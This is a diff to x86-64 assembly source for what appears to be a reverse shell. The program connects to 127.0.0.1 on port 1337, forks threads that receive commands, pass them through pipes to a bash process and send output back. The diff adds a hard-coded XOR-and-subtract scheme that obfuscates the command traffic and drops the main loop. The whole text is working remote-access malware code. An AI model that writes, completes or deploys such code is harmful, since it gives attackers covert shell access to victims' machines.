@@ -10,7 +10,6 @@ _start:
     mov r15, rsp        ; buffer for incoming traffic
     sub rsp, 0x9
     mov r14, rsp        ; buffer for outgoing traffic
-    ;mov r11, 0x00
 
     ;              SYS_SOCKET
 
@@ -25,7 +24,8 @@ _start:
 
     ;               SYS_CONNECT
     mov rbx, 0xfeffff80         ; xor of 0x0100007f and 0xffffffff
-    xor rbx, 0xffffffff         ; mov 0x0100007f in rbx
+    mov rax, 0xffffffff
+    xor rbx, rax                ; mov 0x0100007f in rbx
     push rbx                    ; s_addr = 127.0.0.1
     push word 0x3905            ; int port = 1337
     push word 0x2               ; int family = AF_INET
@@ -55,18 +55,17 @@ _start:
     mov r12, rsp               ; save pipe addr to r12 register (input)
 
     mov rax, 22                ; sys_pipe
-    mov rdi, rsp               ; rdi = addr of int
+    mov rdi, rsp               ; rdi = addr of int (both pipes)
     syscall
 
 
-    .loop:
-        call _recv_thread
-        call _bash_thread
-        call _send_command
-    jmp .loop
+    call _recv_thread
+    call _bash_thread
+    call _send_command
 ;call _echo
 
 _recv_thread:
+    xor rbx, rbx
 
     mov rax, 57 ; SYS_FORK Op Code
     syscall
@@ -77,6 +76,13 @@ _recv_thread:
     ret
 
     .readloop:
+    ;   50424d444d4d4833
+        ;push qword 0x33484d4d444d4250   ; IV = PBMDMMH3
+        cmp rbx, 8
+        je .donotresetcounter
+            mov rcx, 1
+        .donotresetcounter:
+        mov r10, rcx
         ;           SYS_READ
         xor     rax, rax          ; SYS_READ rax = 0
         mov     rdi, r9           ; client socket fd
@@ -84,17 +90,47 @@ _recv_thread:
         mov     rdx, 8            ; read 8 bytes 
         syscall
 
+        mov rcx, r10
+
         mov rbx, rax
+        ; IV = PBMDMMH3
+        xor byte [r15], 0x50
+        sub byte [r15], cl
+        xor byte [r15 + 1], 0x42
+        sub byte [r15 + 1], cl
+        xor byte [r15 + 2], 0x4d
+        sub byte [r15 + 2], cl
+        xor byte [r15 + 3], 0x44
+        sub byte [r15 + 3], cl
+        xor byte [r15 + 4], 0x4d
+        sub byte [r15 + 4], cl
+        xor byte [r15 + 5], 0x4d
+        sub byte [r15 + 5], cl
+        xor byte [r15 + 6], 0x48
+        sub byte [r15 + 6], cl
+        xor byte [r15 + 7], 0x33
+        sub byte [r15 + 7], cl
 
         ;           SYS_WRITE
         xor     rdi, rdi
         mov     rax, 1            ; SYS_WRITE rax = 1
         mov     edi, [r13+2]      ; pipe write side
-        ror     rdi, 16           ; rol right 16 bits
+        ror     rdi, 16           ; roll right 16 bits
         mov     rsi, r15          ; buffer
         mov     rdx, rbx          ; number of bytes received in _read
         syscall
 
+        mov rcx, r10
+
+        xor rax, rax
+        mov al, cl
+        inc rax
+        cmp rax, 256
+        je .donotinccounter
+            inc cl
+            jmp .readloop
+        .donotinccounter:
+        mov rcx, 1
         jmp .readloop
 
 
